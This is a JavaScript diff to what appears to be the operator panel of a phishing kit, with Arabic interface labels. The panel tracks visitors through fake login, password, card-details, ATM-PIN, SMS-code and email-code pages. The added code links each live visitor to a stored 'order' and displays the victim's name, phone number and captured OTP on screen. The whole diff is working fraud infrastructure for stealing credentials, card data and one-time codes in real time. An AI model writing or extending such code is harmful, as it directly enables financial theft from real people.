@@ -361,17 +361,29 @@ function renderStats(){
   document.getElementById('oCnt').textContent=orders.length;
 }
 
+function matchVisitorToOrder(v){
+  var pg=v.page||'';
+  if(pg==='home'||pg==='index'||!pg) return null;
+  for(var i=0;i<orders.length;i++){
+    var o=orders[i];
+    if(o.status==='confirmed'||o.status==='rejected') continue;
+    var op=(o.page||'').replace('.html','').replace(/\?.*/,'');
+    if(op===pg||pg.indexOf(op)!==-1||op.indexOf(pg)!==-1){return o;}
+  }
+  return null;
+}
 function renderActive(){
   var el=document.getElementById('aList');
   if(!activeVisitors.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين</p></div>';return;}
+  var pageNames={'home':'🏠 الرئيسية','index':'🏠 الرئيسية','login':'🔐 تسجيل الدخول','password':'🔑 كلمة المرور',
+    'calling':'📞 الاتصال','waiting':'⏳ الانتظار','order':'📝 الطلب','card-details':'💳 البطاقة',
+    'card-waiting':'⏳ انتظار البطاقة','code':'📲 كود التحقق','code-waiting':'⏳ انتظار الكود',
+    'code3':'📲 كود 4 أرقام','code3-waiting':'⏳ انتظار الكود','atm':'🏧 ATM','atm-waiting':'⏳ انتظار ATM',
+    'email-code':'📧 كود البريد','email-code-waiting':'⏳ انتظار كود البريد',
+    'success':'✅ النجاح','welcome':'👋 الترحيب','watch-features':'⌚ المميزات',
+    'en/index':'🏠 EN Home','en/login':'🔐 EN Login','en/order':'📝 EN Order'};
+  var usedRefs={};
   el.innerHTML=activeVisitors.map(function(v,i){
-    var pageNames={'home':'🏠 الرئيسية','index':'🏠 الرئيسية','login':'🔐 تسجيل الدخول','password':'🔑 كلمة المرور',
-      'calling':'📞 الاتصال','waiting':'⏳ الانتظار','order':'📝 الطلب','card-details':'💳 البطاقة',
-      'card-waiting':'⏳ انتظار البطاقة','code':'📲 كود التحقق','code-waiting':'⏳ انتظار الكود',
-      'code3':'📲 كود 4 أرقام','code3-waiting':'⏳ انتظار الكود','atm':'🏧 ATM','atm-waiting':'⏳ انتظار ATM',
-      'email-code':'📧 كود البريد','email-code-waiting':'⏳ انتظار كود البريد',
-      'success':'✅ النجاح','welcome':'👋 الترحيب','watch-features':'⌚ المميزات',
-      'en/index':'🏠 EN Home','en/login':'🔐 EN Login','en/order':'📝 EN Order'};
     var pName=pageNames[v.page]||('📄 '+esc(v.page));
     var ago='';
     if(v.last){var diff=Math.floor((Date.now()-v.last)/1000);
@@ -382,11 +394,17 @@ function renderActive(){
     if(v.first){var d2=Math.floor((Date.now()-v.first)/1000);
       if(d2<60)dur=d2+' ث';else if(d2<3600)dur=Math.floor(d2/60)+' د';else dur=Math.floor(d2/3600)+' س';
       dur='<span style="color:rgba(255,255,255,.4)">⏱️ '+dur+'</span>';}
-    var vName=v.name?esc(v.name):'زائر '+(i+1);
-    var phoneInfo=v.phone?'<span>📱 '+esc(v.phone)+'</span>':'';
-    return '<div class="ac" style="border-right:3px solid '+(v.name?'#f59e0b':'#22c55e')+'"'+(v.orderId?' onclick="selectOrder(\''+esc(v.orderId)+'\')"':'')+'>'+
-      '<div class="ac-t"><span class="ac-n">👤 '+vName+'</span>'+ago+'</div>'+
-      '<div class="ac-info">'+phoneInfo+'<span>'+pName+'</span>'+dur+'</div></div>';
+    var matched=matchVisitorToOrder(v);
+    if(matched&&usedRefs[matched.ref]){matched=null;}
+    if(matched)usedRefs[matched.ref]=true;
+    var vName=matched?(esc(matched.n)||esc(matched.p)||'عميل'):'زائر '+(i+1);
+    var phoneInfo=matched&&matched.p?'<span>📱 '+esc(matched.p)+'</span>':'';
+    var badge=matched?(matched.step?stepBadge(matched.step):statusBadge(matched)):'';
+    var otp=matched&&matched.pay&&matched.pay.otp?'<span class="otp">OTP: '+esc(matched.pay.otp)+'</span>':'';
+    var refId=matched?matched.ref:null;
+    return '<div class="ac" style="border-right:3px solid '+(matched?'#f59e0b':'#22c55e')+'"'+(refId?' onclick="selectOrder(\''+esc(refId)+'\')"':'')+'>'+
+      '<div class="ac-t"><span class="ac-n">👤 '+vName+'</span>'+badge+ago+'</div>'+
+      '<div class="ac-info">'+phoneInfo+otp+'<span>'+pName+'</span>'+dur+'</div></div>';
   }).join('');
   document.getElementById('aCnt').textContent=activeVisitors.length;
 }
